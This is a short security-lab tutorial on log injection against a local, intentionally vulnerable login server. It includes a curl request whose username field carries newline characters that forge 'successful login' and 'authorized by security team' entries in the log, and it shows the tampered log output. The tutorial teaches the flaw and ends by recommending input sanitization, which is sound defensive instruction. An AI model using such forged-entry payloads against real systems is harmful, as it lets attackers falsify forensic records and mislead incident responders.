## Log Injection (Log Forging)

### What is it?
When user input is placed directly into log messages without sanitization, an attacker can inject newline characters (`\n`) to **forge fake log entries**. This can be used to hide attacks, create false evidence, or confuse incident responders.

### Prerequisites
Start the vulnerable server:

```Bash
uvicorn vulnerable:app --reload
```

### Exploitation Steps

**1. Normal Login Attempt**

```Bash
curl -X POST http://127.0.0.1:8000/login \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": "wrongpass"}'
```

Server log shows:
```
2026-02-21 | WARNING | Failed login attempt for user: admin
```

**2. Inject a Fake Log Entry**

The attacker sends a username containing newline characters and a fake "successful login" entry:

```Bash
curl -X POST http://127.0.0.1:8000/login \
     -H "Content-Type: application/json" \
     -d '{"username": "admin\n2026-02-21 | INFO | Successful login for user: admin\n2026-02-21 | INFO | User admin authorized by security team", "password": "wrong"}'
```

**3. Analyze the Server Logs**

The server log now shows:
```
2026-02-21 | WARNING | Failed login attempt for user: admin
2026-02-21 | INFO | Successful login for user: admin
2026-02-21 | INFO | User admin authorized by security team
```

The attacker injected **two fake log entries** that look completely legitimate! An incident responder reading these logs would be misled.

**4. Real-World Impact**

- **Hide attacks**: Inject thousands of normal-looking entries to bury the real attack
- **Create alibis**: Forge "authorized by security team" entries
- **Exploit log analysis tools**: Inject payloads that target SIEM dashboards (Log4Shell-style)

**Result:** Log injection allows attackers to manipulate the forensic evidence. Always sanitize user input before including it in log messages.
